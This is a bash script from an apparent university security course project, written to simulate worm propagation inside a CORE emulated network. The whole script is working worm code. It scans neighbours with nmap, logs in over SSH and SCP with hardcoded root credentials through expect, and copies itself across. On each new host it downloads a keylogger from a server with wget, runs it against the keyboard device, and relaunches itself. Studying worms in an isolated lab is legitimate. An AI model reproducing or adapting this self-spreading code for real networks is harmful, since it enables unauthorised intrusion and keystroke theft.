#!/bin/bash
#
# CSCI 6531 Final Project - Propagation Shell Script
# Author: Nick Capurso
# --------------------------------------------------
# This is a shell script used to simulate worm propagation in a CORE simulated network.
# Vulnerable neighbors are found using an NMAP ping scan, this script is
# then copied an executed on a remote machine using SCP & SSH. Additionally,
# the script will download and execute a keylogger hosted on a remote server
# on a newly infected machine.
#
# Usage:
#   ./propagate.sh
#
# Requires:
#   nmap expect
#
# Note: should be run with root privileges, but it isn't necessarily required...
#       regular users may run out of buffer space when NMAP does its ping scan.
#
#       The keylogger server's IP is set to 10.0.3.10, change the SERVER variable
#       if this is not the case. The keylogger file is named "logger" again, change
#       the WORM variable if this is not the case.


# Turns prints on and off
DEBUG=0                 

# Constants for errors when logging into a vulnerable machine
ERR_REFUSED=1   
ERR_ALREADY_INFECTED=2  

# Keeps track of CORE directory (determines the correct number at runtime)
# since the CORE directory is of the form /tmp/pycore.<number>
DIR_PREFIX="/tmp/pycore."   

# The server's IP which hosts the keylogger.
SERVER="10.0.3.10"

# The name of the keylogger file hosted on the server
WORM="logger"

TARGET_USER="root"
TARGET_PASSWD="core"

# Dynamically determining the event driver for the keyboard
KBD_EVENT=$(cat /proc/bus/input/devices | grep "sysrq kbd" | sed -rn "s/.*d (.*)$/\1/p")

# Full path to the keyboard event driver
KBD_DEVICE="/dev/input/$KBD_EVENT"


# Unused -- was used for testing purposes. Checks that the passed string
# is a valid IP address format.
ipValidate(){
    [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
    return $?
}

# Passed an IP as an argument, attempts to ping it and returns
# whether or not the ping was successful.
#
# Returns 1 if the host is down, 0 if up, 2 if bad IP is supplied.
ipCheck(){
    if [ $DEBUG -eq 0 ]; then
      echo "Testing IP: $1..."
    fi

    local ip=$1
    
    # Check valid IP was supplied
    if ! ipValidate $ip; then
        echo "Bad IP supplied"
        exit 2
    fi

    # Ping the IP with one packet and return 1 if the host is not up, 0 otherwise
    return $(ping $ip -c 1 -W 1 | grep -c "0 received")
}

# Given a subnet mask, outputs the number of 1's for CIDR notation.
# Ex. 255.255.255.0 => 24
maskToPrefix(){
    local mask=$1

    # Check that a valid mask was supplied
    if ! ipValidate $mask; then
        return 2
    fi
     
    # We're going to process the mask, so we should delimit it by periods
    IFS_BAK=$IFS
    IFS="."
    numBits=0

    
    # Accumulates numBits based on the value of each part of the mask. Modified from:
    # http://www.linuxquestions.org/questions/programming-9/bash-cidr-calculator-646701/
    for num in $mask; do
        case $num in
            255) numBits=$((numBits + 8));;
            # Any number < 255 means this will be the end of the mask
            254) numBits=$((numBits + 7)); break;;
            252) numBits=$((numBits + 6)); break;;
            248) numBits=$((numBits + 5)); break;;
            240) numBits=$((numBits + 4)); break;;
            224) numBits=$((numBits + 3)); break;;
            192) numBits=$((numBits + 2)); break;;
            128) numBits=$((numBits + 1)); break;;
            0);;
            *) echo "Bad mask supplied"; exit 2;;
        esac
    done

    # Output the number of bits.
    echo "$numBits"

    # Restore the old string delimiter
    IFS=$IFS_BAK
}

# Prints an array (if DEBUG is set), given all its elements
# You can also pass a label for the array as the first argument
printArray(){
    if [ $DEBUG -eq 0 ]; then
        for i in $@; do
            echo -e $i
        done
    fi
}

# Print out the keyboard driver path
if [ $DEBUG -eq 0 ]; then
    echo -e "KBD Device:\n$KBD_DEVICE\n"
fi

# CORE creates a new directory for each node under /tmp/pycore.<num>/<hostname>
# Get the pycore instance number (the folder's suffix under /tmp)
pycoreNum=$(ls /tmp | grep pycore | cut -d "." -f 2)

# The full directory name of the current node is then just appending <hostname>.conf
DIR_PREFIX="$DIR_PREFIX$pycoreNum"
myDir="$DIR_PREFIX/$(hostname).conf"
myHostname=$(hostname)

# Print out the directory name
if [ $DEBUG -eq 0 ]; then
    echo -e "My dir:\n$myDir\n"
fi

#  Array to hold all ethernet interfaces that the node has
ethInterfaces=()

# Find each ethernet interface from ifconfig
for interface in $(ifconfig | grep eth | cut -d " " -f 1); do
    ethInterfaces+=($interface)
done

# Print out the interfaces array
printArray "Interfaces:" ${ethInterfaces[@]} 
echo

# Next, for each interface, get the associated IP and subnet mask
myIps=()
for interface in ${ethInterfaces[@]}; do
    # IPs are the first thing on the 2nd line of ifconfig (after the words "inet addr:")
    ip=$(ifconfig $interface | sed -n '2p' | cut -d ":" -f 2 | cut -d " " -f 1)

    # Second line of ifconfig output contains the mask.
    # Delimit the line by colons, then the mask will be the 4th field
    mask=$(ifconfig $interface | sed -n '2p' | cut -d ":" -f 4)

    # Get the CIDR notation
    prefix="/$(maskToPrefix $mask)"

    # Let the full ip = "IP/CIDR"
    myIps+=($ip$prefix)
done

# Print out the IPs
printArray "\nIPs:" ${myIps[@]}
echo

# Next, determine all hosts that are reachable...
hostsUp=()
for ip in ${myIps[@]}; do
    # ...using an nmap ping scan (grep & cut are used to obtain the IP on lines preceeding "Host is up")
    for scanResult in $(nmap -sP $ip 2>/dev/null | grep up -B 1 | grep report | cut -d " " -f 5); do
        # Only add it to the array if it isn't already in there
        if ! [[ ${myIps[@]} =~ $scanResult ]]; then
            hostsUp+=($scanResult)
        fi
    done
done

# Print the array of found hosts
printArray "\nNeighbors:" ${hostsUp[@]} 
echo

# Finally, propagate to each up host
for host in ${hostsUp[@]}; do
    echo -e "--------------------\nTrying: $host"

    # Expect script to accept RSA fingerprint and enter password
    expect -c "
        set timeout 2
        spawn scp propagate.sh $TARGET_USER@$host:
        expect refused { exit $ERR_REFUSED; }
        expect yes/no { send yes\r ; exp_continue }
        expect password: { send $TARGET_PASSWD\r; exp_continue }
        sleep 1
        exit 0
    "
    # Skip this host if the SSH port was closed
    if [ $? -eq $ERR_REFUSED ]; then
        continue
    fi

    # Expect script to SSH, check if already infected, download and run the keylogger
    # and propagate again.
    #
    # Infected hosts are identifable if the keylogger is already present. The 
    # propagation script is run and output is redirected into debug.txt. Keylogger
    # output is redirected into keylog.txt. A file is also created to indicate who
    # infected the host.
    expect -c "
        set timeout 2
        spawn ssh $TARGET_USER@$host
        expect refused { exit $ERR_REFUSED; }
        expect yes/no { send yes\r ; exp_continue }
        expect password: { send $TARGET_PASSWD\r; exp_continue }
        expect *~\#* {send \"cd $DIR_PREFIX/\$\(hostname\).conf\r\";}
        expect *.conf\#* {send \"ls | grep $WORM -c\r\";}
        expect -re {\n[1-9].*#} {exit $ERR_ALREADY_INFECTED;}
        expect *.conf\#* {send \"echo 'Not infected'\r\";}
        expect *.conf\#* {send \"cp ~/propagate.sh ./\r\";}
        expect *.conf\#* {send \"wget $SERVER/$WORM\r\";}
        expect *.conf\#* {send \"chmod +x ./$WORM\r\";}
        expect *.conf\#* {send \"./$WORM $KBD_DEVICE > keylog.txt &\r\";}
        expect *.conf\#* {send \"touch infectedby${myHostname}\r\";}
        expect *.conf\#* {send \"./propagate.sh > debug.txt &\r\";}
        expect *.conf\#* {send \"exit\r\";}
        sleep 1
        exit 0
    "

    if [ $? -eq $ERR_ALREADY_INFECTED ]; then
        echo 
        echo "Already infected $host"
    fi
done

echo -e "\n--------------------\n"
cd $myDir

# Create a file with the time propagation finished
echo $(date "+%T.%3N") > finished
